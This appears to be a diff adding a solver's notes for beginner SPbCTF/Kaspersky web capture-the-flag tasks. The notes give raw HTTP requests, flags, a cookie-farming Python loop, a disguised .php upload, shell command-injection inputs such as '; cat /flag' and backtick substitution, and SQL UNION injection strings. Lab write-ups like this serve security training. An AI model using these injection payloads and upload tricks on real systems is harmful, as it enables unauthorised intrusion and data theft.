@@ -1,0 +1,1037 @@
+1) http://kslweb1.spb.ctf.su/first/level1/
+
+GET /first/level1/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+->
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 28 Jul 2026 19:08:40 GMT
+Content-Type: text/plain
+Content-Length: 50
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+
+Done! Flag: KSL{fc813aadb96c4a00b6887f73cee4efde}
+
+2) http://kslweb1.spb.ctf.su/first/level2/
+
+GET /first/level2/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+->
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 28 Jul 2026 19:10:26 GMT
+Content-Type: text/html
+Content-Length: 127
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Vary: Accept-Encoding
+
+<pre>Done! Flag is not visible here: <!-- KSL{4dc7b79ae6f3c46c904970ff7cdcecda} -->
+
+
+<i>(how do i look at html?)</i></pre>
+
+3) http://kslweb1.spb.ctf.su/first/level3/
+
+curl http://kslweb1.spb.ctf.su/first/level3/
+
+->
+
+Done! Flag: KSL{1cd1426c8929600867035e44edf22329}
+
+Или
+
+GET /first/level3/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+User-Agent: curl/7.54
+
+->
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 28 Jul 2026 19:17:23 GMT
+Content-Type: text/plain
+Content-Length: 50
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+
+Done! Flag: KSL{1cd1426c8929600867035e44edf22329}
+
+4) http://kslweb1.spb.ctf.su/first/level4/
+
+POST /first/level4/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 23
+
+want_flag=YES&code=1337
+
+->
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 28 Jul 2026 19:20:14 GMT
+Content-Type: text/plain
+Content-Length: 50
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+
+Done! Flag: KSL{a6354c29e728214e69c8fda2298b35fb}
+
+5) http://kslweb1.spb.ctf.su/first/level5/
+
+POST /first/level5/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 40
+
+fun=Kaspersky%20%26%20Summer%20%26%20Lab
+
+->
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 28 Jul 2026 19:21:48 GMT
+Content-Type: text/plain
+Content-Length: 50
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+
+Done! Flag: KSL{72772dd0eee640322a3ecfb24ecab17b}
+
+6) http://kslweb1.spb.ctf.su/first/level6/
+
+GET /first/level6/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+SPbCTF: Pretty cool
+
+->
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 28 Jul 2026 19:24:25 GMT
+Content-Type: text/plain
+Content-Length: 50
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+
+Done! Flag: KSL{6641c847f3479f95fcd8b837b4491f32}
+
+7) http://kslweb1.spb.ctf.su/first/level7/
+
+GET /first/level7/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+Cookie: test0=test0; test1=test1; test2=test2; test3=test3; test4=test4; test5=test5; test6=test6; test7=test7; test8=test8; test9=test9; test10=test10; test11=test11; test12=test12; test13=test13; test14=test14; test15=test15; test16=test16; test17=test17; test18=test18; test19=test19; test20=test20; test21=test21; test22=test22; test23=test23; test24=test24; test25=test25; test26=test26; test27=test27; test28=test28; test29=test29; test30=test30; test31=test31; test32=test32; test33=test33; test34=test34; test35=test35; test36=test36; test37=test37; test38=test38; test39=test39; test40=test40; test41=test41; test42=test42; test43=test43; test44=test44; test45=test45; test46=test46; test47=test47; test48=test48; test49=test49; test50=test50; test51=test51; test52=test52; test53=test53; test54=test54; test55=test55; test56=test56; test57=test57; test58=test58; test59=test59; test60=test60; test61=test61; test62=test62; test63=test63; test64=test64; test65=test65; test66=test66; test67=test67; test68=test68; test69=test69; test70=test70; test71=test71; test72=test72; test73=test73; test74=test74; test75=test75; test76=test76; test77=test77; test78=test78; test79=test79; test80=test80; test81=test81; test82=test82; test83=test83; test84=test84; test85=test85; test86=test86; test87=test87; test88=test88; test89=test89; test90=test90; test91=test91; test92=test92; test93=test93; test94=test94; test95=test95; test96=test96; test97=test97; test98=test98; test99=test99;
+
+->
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 28 Jul 2026 19:28:22 GMT
+Content-Type: text/plain
+Content-Length: 50
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+
+Done! Flag: KSL{d5a0bc3afdc571bab78da4f96c9965b5}
+
+8) http://kslweb1.spb.ctf.su/first/level8/
+
+GET /first/level8/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+
+->
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 28 Jul 2026 19:29:42 GMT
+Content-Type: text/plain
+Content-Length: 80
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+SPbCTF-Flag: KSL{f688c791b3dcefbc3755ecb47a16eca8}
+Vary: Accept-Encoding
+
+Done! Have your flag in the response headers (how to look at response headers?)
+
+9) http://kslweb1.spb.ctf.su/first/level9/
+
+GET /first/level9/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+Cookie: do_i_really_want_flag_for_level_nine=yes
+
+->
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 28 Jul 2026 19:31:51 GMT
+Content-Type: text/plain
+Content-Length: 50
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+
+Done! Flag: KSL{f5a0198b0eb961dc5033fbacbcfda426}
+
+10) http://kslweb1.spb.ctf.su/first/level10/
+
+GET /first/level10/robots.txt HTTP/1.1
+Host: kslweb1.spb.ctf.su
+
+->
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 28 Jul 2026 19:33:19 GMT
+Content-Type: text/plain
+Content-Length: 62
+Connection: keep-alive
+Last-Modified: Sun, 09 Jul 2017 08:25:14 GMT
+ETag: "3e-553de349b6e80"
+Accept-Ranges: bytes
+
+User-agent: *
+Disallow: /level10/hidden_admin_panel_WOW.php
+
+---
+
+GET /first/level10/hidden_admin_panel_WOW.php HTTP/1.1
+Host: kslweb1.spb.ctf.su
+
+->
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 28 Jul 2026 19:34:07 GMT
+Content-Type: text/plain
+Content-Length: 50
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+
+Done! Flag: KSL{b16cb73b4afff7ce69b068c78197bd6b}
+
+11) http://kslweb1.spb.ctf.su/first/level11/
+
+dirbuster - directory-list-2.3-small.txt
+
+->
+
+find folder 'management'
+
+---
+
+GET /first/level11/management/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+
+->
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 28 Jul 2026 19:39:45 GMT
+Content-Type: text/plain
+Content-Length: 50
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+
+Done! Flag: KSL{28a9e7ffd044fd7217a3e1bda6b3b674}
+
+12) http://kslweb1.spb.ctf.su/first/level12/
+
+GET /first/level12/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+
+->
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 28 Jul 2026 19:44:07 GMT
+Content-Type: text/html
+Content-Length: 970
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Vary: Accept-Encoding
+
+<form onsubmit='tryPassword(); return false;'>
+  Try to guess Flag: <input type='text' id='ctfflag' /> <input type='submit' value='Check &raquo;' />
+</form>
+
+<script>
+function tryPassword() {
+  var flag = document.getElementById('ctfflag').value;
+
+  if (flag.length != 32) {
+    alert("WRONG because of # 1");
+    return;
+  }
+
+  if (flag.substr(0, 16) != "4fd1a3d79a407b66") {
+    alert("WRONG because of # 2");
+    return;
+  }
+
+  if (flag.substr(19, 3) != "cbf") {
+    alert("WRONG because of # 3");
+    return;
+  }
+
+  if (flag.substr(16, 3) != "d37") {
+    alert("WRONG because of # 4");
+    return;
+  }
+
+  if (flag.substr(22, 6) != "61a7ab") {
+    alert("WRONG because of # 5");
+    return;
+  }
+
+  if (flag.substr(28, 2) != flag.substr(0, 2)) {
+    alert("WRONG because of # 6");
+    return;
+  }
+
+  if (flag.substr(30, 2) != 0x0E) {
+    alert("WRONG because of # 7");
+    return;
+  }
+
+  alert("YES, exactly!");
+}
+</script>
+
+---
+
+4fd1a3d79a407b66
+d37
+cbf
+61a7ab
+4f
+14
+
+->
+
+4fd1a3d79a407b66d37cbf61a7ab4f14
+
+->
+
+KSL{4fd1a3d79a407b66d37cbf61a7ab4f14}
+
+13) http://kslweb1.spb.ctf.su/first/level13/
+
+GET /first/level13/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+
+->
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 28 Jul 2026 19:48:47 GMT
+Content-Type: text/html
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Vary: Accept-Encoding
+Content-Length: 612708
+
+Where else the flag can be placed by JS?
+
+<script>
+[][(![]+[])[+[]]+
+...
+...
+...
++[]+[+[]]])();
+</script>
+
+---
+
+https://enkhee-osiris.github.io/Decoder-JSFuck/
+
+->
+
+var _0xa08a=["\x73\x70\x62\x63\x74\x66\x5F\x66\x6C\x61\x67\x5F\x6C\x65\x76\x65\x6C\x31\x33","\x36\x33\x66\x30\x37\x62\x62\x66\x35\x35\x37\x38\x37\x65\x61\x65\x64\x64\x39\x64\x33\x37\x66\x61\x65\x62\x34\x37\x38\x33\x65\x64","\x73\x65\x74\x49\x74\x65\x6D"];localStorage[_0xa08a[2]](_0xa08a[0],_0xa08a[1])
+
+---
+
+localStorage
+
+->
+
+spbctf_flag_level13:"63f07bbf55787eaedd9d37faeb4783ed"
+
+---
+
+\x73 -> HEX
+115 -> DEC
+s -> ASCII
+
+\x70
+112
+p
+
+\x62
+98
+b
+
+---
+
+Burp suite Decoder - Decode as ASCII hex
+
+14) http://kslweb1.spb.ctf.su/first/level14/
+
+GET /first/level14/index.php?give_flag=1 HTTP/1.1
+Host: kslweb1.spb.ctf.su
+
+->
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 28 Jul 2026 20:08:24 GMT
+Content-Type: text/html
+Content-Length: 7391
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Vary: Accept-Encoding
+
+PNG
+...
+...
+...
+
+---
+
+Flag into PNG file
+
+15) http://kslweb1.spb.ctf.su/second/level15/
+
+POST /second/level15/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+Content-Length: 1521
+Cache-Control: max-age=0
+Accept-Language: ru-RU,ru;q=0.9
+Origin: http://kslweb1.spb.ctf.su
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydNpoENG5hkhRBFfH
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://kslweb1.spb.ctf.su/second/level15/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+------WebKitFormBoundarydNpoENG5hkhRBFfH
+Content-Disposition: form-data; name="myfile"; filename="test.txt"
+Content-Type: text/plain
+
+1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+
+
+------WebKitFormBoundarydNpoENG5hkhRBFfH--
+
+->
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 28 Jul 2026 20:23:29 GMT
+Content-Type: text/html
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Content-Length: 50
+
+Done! Flag: KSL{4e15221043cbd0619409f282dad76c0f}
+
+16) http://kslweb1.spb.ctf.su/second/level16
+
+http://kslweb1.spb.ctf.su:58080/second/level16
+
+---
+
+netcat -C kslweb1.spb.ctf.su 58080
+
+GET /second/level16/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+
+->
+
+HTTP/1.1 200 OK
+Date: Tue, 28 Jul 2026 20:25:14 GMT
+Server: Apache/2.4.7 (Ubuntu)
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Content-Length: 50
+Content-Type: text/plain
+
+Done! Flag: KSL{d2045bf39b9b0ec7d6644047a92f016d}
+
+17) http://kslweb1.spb.ctf.su/second/level17
+
+http://kslweb1.spb.ctf.su:58080/second/level17
+
+---
+
+netcat -C kslweb1.spb.ctf.su 58080
+
+GET /second/level17/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+
+->
+
+HTTP/1.1 200 OK
+Date: Tue, 28 Jul 2026 20:27:10 GMT
+Server: Apache/2.4.7 (Ubuntu)
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Vary: Accept-Encoding
+Content-Length: 200
+Content-Type: text/plain
+
+Nope, you should send a request with at least 100 different cookies (how are cookies made in raw http?)
+
+Current number of cookies: 0
+
+Current HTTP headers: Array
+(
+    [Host] => kslweb1.spb.ctf.su
+)
+
+---
+
+netcat -C kslweb1.spb.ctf.su 58080
+
+GET /second/level17/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+Cookie: test0=test0; test1=test1; test2=test2; test3=test3; test4=test4; test5=test5; test6=test6; test7=test7; test8=test8; test9=test9; test10=test10; test11=test11; test12=test12; test13=test13; test14=test14; test15=test15; test16=test16; test17=test17; test18=test18; test19=test19; test20=test20; test21=test21; test22=test22; test23=test23; test24=test24; test25=test25; test26=test26; test27=test27; test28=test28; test29=test29; test30=test30; test31=test31; test32=test32; test33=test33; test34=test34; test35=test35; test36=test36; test37=test37; test38=test38; test39=test39; test40=test40; test41=test41; test42=test42; test43=test43; test44=test44; test45=test45; test46=test46; test47=test47; test48=test48; test49=test49; test50=test50; test51=test51; test52=test52; test53=test53; test54=test54; test55=test55; test56=test56; test57=test57; test58=test58; test59=test59; test60=test60; test61=test61; test62=test62; test63=test63; test64=test64; test65=test65; test66=test66; test67=test67; test68=test68; test69=test69; test70=test70; test71=test71; test72=test72; test73=test73; test74=test74; test75=test75; test76=test76; test77=test77; test78=test78; test79=test79; test80=test80; test81=test81; test82=test82; test83=test83; test84=test84; test85=test85; test86=test86; test87=test87; test88=test88; test89=test89; test90=test90; test91=test91; test92=test92; test93=test93; test94=test94; test95=test95; test96=test96; test97=test97; test98=test98; test99=test99;
+
+->
+
+HTTP/1.1 200 OK
+Date: Tue, 28 Jul 2026 20:28:39 GMT
+Server: Apache/2.4.7 (Ubuntu)
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Content-Length: 50
+Content-Type: text/plain
+
+Done! Flag: KSL{30d9525fd46020028a987071785b1033}
+
+18) http://kslweb1.spb.ctf.su/second/level18
+
+http://kslweb1.spb.ctf.su:58080/second/level18
+
+---
+
+netcat -C kslweb1.spb.ctf.su 58080
+
+GET /second/level18/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+
+->
+
+HTTP/1.1 200 OK
+Date: Tue, 28 Jul 2026 20:30:05 GMT
+Server: Apache/2.4.7 (Ubuntu)
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Vary: Accept-Encoding
+Content-Length: 182
+Content-Type: text/plain
+
+!!!!!!######Nope, you should send one POST field 'makers' with words 'Kaspersky & SPBCTF' (how post values are encoded?)
+
+Current HTTP method: GET
+
+Current POST fields: array(0) {
+}
+
+---
+
+netcat -C kslweb1.spb.ctf.su 58080
+
+POST /second/level18/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 31
+
+makers=Kaspersky%20%26%20SPBCTF
+
+->
+
+HTTP/1.1 200 OK
+Date: Tue, 28 Jul 2026 20:43:15 GMT
+Server: Apache/2.4.7 (Ubuntu)
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Content-Length: 50
+Content-Type: text/plain
+
+Done! Flag: KSL{75c8c25412af41a055b8e749858d43b2}
+
+19) http://kslweb1.spb.ctf.su/second/level19
+
+http://kslweb1.spb.ctf.su:58080/second/level19
+
+---
+
+netcat -C kslweb1.spb.ctf.su 58080
+
+GET /second/level19/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+
+->
+
+HTTP/1.1 200 OK
+Date: Wed, 29 Jul 2026 05:17:27 GMT
+Server: Apache/2.4.7 (Ubuntu)
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Vary: Accept-Encoding
+Content-Length: 320
+Content-Type: text/plain
+
+Nope, you should send one POST field 'smiley' with this exact face - it contains 6 lines of text:
+
++|||||+
+| - - |
+| O_o |
+|  |  |
+| \__ |
+ \___/
+
+(how post values are encoded? if google doesnt help maybe we can see how it is transmitted on some other website?)
+
+Current HTTP method: GET
+
+Current POST fields: Array
+(
+)
+
+---
+
+https://en.wikipedia.org/wiki/Percent-encoding
+
+\r\n - %0D%0A
+\n - %0A
+
+echo '###';
+echo urlencode("+|||||+
+| - - |
+| O_o |
+|  |  |
+| \__ |
+ \___/");
+echo '###';
+
+---
+
+netcat -C kslweb1.spb.ctf.su 58080
+
+POST /second/level19/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 101
+
+smiley=%2B%7C%7C%7C%7C%7C%2B%0A%7C+-+-+%7C%0A%7C+O_o+%7C%0A%7C++%7C++%7C%0A%7C+%5C__+%7C%0A+%5C___%2F
+
+->
+
+KSL{c4976923ad0e4af3699ed931960801d2}
+
+20) http://kslweb1.spb.ctf.su/second/level20
+
+http://kslweb1.spb.ctf.su:58080/second/level20
+
+---
+
+netcat -C kslweb1.spb.ctf.su 58080
+
+GET /second/level20/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+
+->
+
+HTTP/1.1 200 OK
+Date: Wed, 29 Jul 2026 08:04:14 GMT
+Server: Apache/2.4.7 (Ubuntu)
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Vary: Accept-Encoding
+Content-Length: 245
+Content-Type: text/plain
+
+Nope, you should send a Basic authentication with your request (how does basic auth work?)
+Username: admin
+Password: s3cr3tp4$$w0RD
+
+Current username: none
+Current password: none
+
+Current HTTP headers: Array
+(
+    [Host] => kslweb1.spb.ctf.su
+)
+
+---
+
+Authorization: Basic <credentials>, where <credentials> is the Base64 Username:Password
+
+https://www.base64encode.org/
+
+---
+
+netcat -C kslweb1.spb.ctf.su 58080
+
+GET /second/level20/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+Authorization: Basic YWRtaW46czNjcjN0cDQkJHcwUkQ=
+
+->
+
+KSL{e9ae74cb633ded5a904c14d0280d4de6}
+
+21) http://kslweb1.spb.ctf.su/second/level21/
+ 
+GET /second/level21/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+ 
+->
+ 
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Sun, 02 Aug 2026 11:52:38 GMT
+Content-Type: text/html
+Content-Length: 461
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Vary: Accept-Encoding
+ 
+You should upload a file here with name ending in <b>.php</b> (for example, 'shell.php') but <b>MIME type</b> 'image/png'<br/><br/><i>(how do i upload file in raw http?)</i><br/><br/><form method='POST' enctype='multipart/form-data'>File: <input type='file' name='myfile' /> <input type='submit' value='Upload &raquo;' /></form><br/><br/><br/><br/>Current HTTP method: <pre>POST</pre><br/><br/>Current uploaded files (PHP $_FILES[] array): <pre>Array
+(
+)
+</pre>
+ 
+---
+ 
+POST /second/level21/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+Content-Length: 195
+Cache-Control: max-age=0
+Accept-Language: ru-RU,ru;q=0.9
+Origin: http://kslweb1.spb.ctf.su
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIdXjlpNldCkIfiO6
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://kslweb1.spb.ctf.su/second/level21/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+ 
+------WebKitFormBoundaryIdXjlpNldCkIfiO6
+Content-Disposition: form-data; name="myfile"; filename="shell.php"
+Content-Type: image/png
+ 
+test shell
+------WebKitFormBoundaryIdXjlpNldCkIfiO6--
+ 
+ 
+->
+ 
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Sun, 02 Aug 2026 11:54:52 GMT
+Content-Type: text/html
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Content-Length: 50
+ 
+Done! Flag: KSL{f1ab7e54aa0d769fdad2af9b206bdcf8}
+ 
+22) http://kslweb1.spb.ctf.su/second/level22/
+ 
+GET /second/level22/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+ 
+->
+ 
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Sun, 02 Aug 2026 11:56:44 GMT
+Content-Type: text/plain
+Content-Length: 172
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Vary: Accept-Encoding
+ 
+=== Voting service ===
+ 
+Currently you have 0 votes.
+ 
+To vote +1, set this cookie: Set-Cookie: votes=1:7bc858c0d521f3bdf696f7187c2da177
+ 
+To get flag you need 17 votes here.
+ 
+---
+ 
+GET /second/level22/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+Cookie: votes=17:595dcec900120b7d9b7542c589b84013
+ 
+->
+ 
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Sun, 02 Aug 2026 12:01:33 GMT
+Content-Type: text/plain
+Content-Length: 50
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+ 
+Done! Flag: KSL{7787599704ff52edaaceb25d8a81d7b3}
+
+23) http://kslweb1.spb.ctf.su/second/level23/
+ 
+GET /second/level23/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+ 
+->
+ 
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Sun, 02 Aug 2026 12:02:58 GMT
+Content-Type: text/plain
+Content-Length: 174
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Vary: Accept-Encoding
+ 
+=== Voting service ===
+ 
+Currently you have 0 votes.
+ 
+To vote +1, set this cookie: Set-Cookie: votes=1:7bc858c0d521f3bdf696f7187c2da177
+ 
+To get flag you need 1337 votes here.
+ 
+---
+ 
+GET /second/level23/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+Cookie: votes=1:7bc858c0d521f3bdf696f7187c2da177
+ 
+->
+ 
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Sun, 02 Aug 2026 12:40:31 GMT
+Content-Type: text/plain
+Content-Length: 174
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Vary: Accept-Encoding
+ 
+=== Voting service ===
+ 
+Currently you have 1 votes.
+ 
+To vote +1, set this cookie: Set-Cookie: votes=2:18066f103b079d3efe562b570433ceb6
+ 
+To get flag you need 1337 votes here.
+ 
+---
+ 
+import requests
+import re
+ 
+votes = '1:7bc858c0d521f3bdf696f7187c2da177'
+ 
+for i in range(0, 1336):
+    url = 'http://kslweb1.spb.ctf.su/second/level23/'
+    cookies = {'votes': votes}
+    response = requests.get(url, cookies=cookies)
+    votes = re.findall(r"votes=(.+)", response.text)[0]
+    print(votes)
+ 
+->
+ 
+...
+...
+1337:daf67b525f9b20cd2dc1413d051d2a8b
+ 
+---
+ 
+GET /second/level23/ HTTP/1.1
+Host: kslweb1.spb.ctf.su
+Cookie: votes=1337:daf67b525f9b20cd2dc1413d051d2a8b
+ 
+->
+ 
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Sun, 02 Aug 2026 16:54:10 GMT
+Content-Type: text/plain
+Content-Length: 50
+Connection: keep-alive
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+ 
+Done! Flag: KSL{a3908a69183647a1e68e515b6e52880a}
+
+###
+...
+###
+
+29) https://2019-10-13-cmdinj.ctf.su/task/ping
+ 
+127.0.0.1 ; cat /flag;
+ 
+->
+ 
+ping -c 1 -W 1 127.0.0.1 ; cat /flag;
+ 
+->
+ 
+flag{ping_task_i5_ea5y___one_who_is_darker}
+ 
+30) https://2019-10-13-cmdinj.ctf.su/task/ls
+ 
+/bin | cat /flag
+ 
+->
+ 
+ls /bin | cat /flag
+ 
+->
+ 
+flag{l5_ta5k___than_twilight}
+ 
+31) https://2019-10-13-cmdinj.ctf.su/task/ps
+ 
+1 && cat /flag
+ 
+->
+ 
+ps u -p 1 && cat /flag
+ 
+->
+ 
+flag{find_a_valid_pid_i5_5o_hard___one_who_is_redder}
+ 
+32) https://2019-10-13-cmdinj.ctf.su/task/echo1
+ 
+test `cat /flag`
+ 
+->
+ 
+echo test `cat /flag`
+ 
+->
+ 
+flag{ech0_i5_the_b3st___than_flowing_blood}
+ 
+33) https://2019-10-13-cmdinj.ctf.su/task/echo2
+ 
+test $(cat /flag)
+ 
+->
+ 
+echo test $(cat /flag)
+ 
+->
+ 
+flag{new_ech0_is_s3cur3___buried_in_the}
+ 
+34) https://2019-10-13-cmdinj.ctf.su/task/grep
+ 
+cat /flag # grep
+ 
+->
+ 
+cat /flag # grep | grep -Eo "[0-9]+"
+ 
+->
+ 
+flag{comment_y0ur_c0de___flow_of_time}
+ 
+35) http://kslweb1.spb.ctf.su/fourth/level28/
+
+SELECT flag FROM flag
+
+->
+
+KSL{2d680e727363a66d9e661d3a3e8eb6bd}
+
+36) http://kslweb1.spb.ctf.su/fourth/level29/
+
+SELECT label FROM products UNION SELECT flag FROM flag
+
+->
+
+KSL{e81187fcadee9c24f06a87e2d4e44186}
+
+37) http://kslweb1.spb.ctf.su/fourth/level30/
+
+NEED Space after "--" !!!
+
+---
+
+a' UNION SELECT flag, flag, flag from flag -- 
+
+->
+
